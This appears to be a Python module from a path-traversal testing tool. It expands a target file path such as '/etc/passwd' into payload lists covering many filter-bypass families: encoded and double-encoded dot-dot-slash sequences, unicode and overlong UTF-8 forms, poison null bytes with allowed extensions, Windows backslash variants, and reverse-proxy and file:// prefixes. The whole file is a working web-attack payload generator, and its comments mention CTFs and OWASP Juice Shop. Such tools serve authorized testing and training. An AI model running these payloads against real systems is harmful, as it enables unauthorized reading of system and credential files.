"""Bypass engine: expand one target file into all path-traversal bypass families.

Encodings are applied deliberately on the canonical segments — we never re-quote
an already-encoded string, which would triple-encode and break the payload.
"""

COMMON_BASES = ["/var/www/images/", "/var/www/html/", "/var/www/", "/home/user/"]
NULL_EXTS = [".md", ".pdf", ".png", ".jpg"]


def _rel(target_file: str) -> str:
    """'/etc/passwd' -> 'etc/passwd' (strip a single leading slash)."""
    return target_file[1:] if target_file.startswith("/") else target_file


def _basic(rel, depth):
    return [("../" * n) + rel for n in range(1, depth + 1)]


def _nonrecursive(rel, depth):
    out = []
    for n in range(1, depth + 1):
        out.append(("....//" * n) + rel)
        out.append(("....\\/" * n) + rel)
    return out


def _encoded(rel, depth):
    out = []
    for n in range(1, depth + 1):
        out.append(("%2e%2e%2f" * n) + rel)
        out.append(("..%2f" * n) + rel)
        out.append(("%252e%252e%252f" * n) + rel)
    return out


def _unicode16(rel, depth):
    """16-bit unicode: . = %u002e, / = %u2215 (IIS/.NET-style decoders)."""
    return [("%u002e%u002e%u2215" * n) + rel for n in range(1, depth + 1)]


def _overlong(rel, depth):
    """UTF-8 overlong: . = %c0%ae, / = %c0%af (lax UTF-8 decoders)."""
    return [("%c0%ae%c0%ae%c0%af" * n) + rel for n in range(1, depth + 1)]


def _leading_path(rel, depth):
    out = []
    for base in COMMON_BASES:
        for n in range(1, depth + 1):
            out.append(base + ("../" * n) + rel)
    return out


def _null_byte(rel, depth, exts=None):
    """Poison-null-byte: append an allowed extension after a null terminator.

    Emits both single (%00) and double-encoded (%2500) forms — the latter is
    needed where the % must itself be URL-encoded before it reaches the file
    system layer (e.g. Node/Express, OWASP Juice Shop /ftp). Includes a
    no-traversal variant for path-segment injection (…/FUZZ)."""
    exts = exts if exts is not None else NULL_EXTS
    out = []
    for ext in exts:
        for nul in ("%00", "%2500"):
            out.append(rel + nul + ext)              # path-segment, no ../
            for n in range(1, depth + 1):
                out.append(("../" * n) + rel + nul + ext)
    return out


def _windows(rel, depth):
    win_rel = rel.replace("/", "\\")
    out = []
    for n in range(1, depth + 1):
        out.append(("..\\" * n) + win_rel)
        out.append(("..\\/" * n) + win_rel)
        out.append(("%2e%2e%5c" * n) + win_rel)
    return out


def _extended(rel, depth):
    """CTF extras: reverse-proxy and protocol-prefix bypasses."""
    out = []
    for n in range(1, depth + 1):
        out.append(("..;/" * n) + rel)
    out.append("file:///" + rel)
    out.append("url:file:///" + rel)
    return out


def generate_payloads(target_file: str, depth: int = 8, os_filter: str = "both",
                      null_exts=None) -> list:
    rel = _rel(target_file)
    out = []
    out.append(target_file)
    out += _basic(rel, depth)
    out += _nonrecursive(rel, depth)
    out += _encoded(rel, depth)
    out += _unicode16(rel, depth)
    out += _overlong(rel, depth)
    out += _leading_path(rel, depth)
    out += _null_byte(rel, depth, null_exts)
    out += _extended(rel, depth)
    if os_filter in ("windows", "both"):
        out += _windows(rel, depth)
    return list(dict.fromkeys(out))
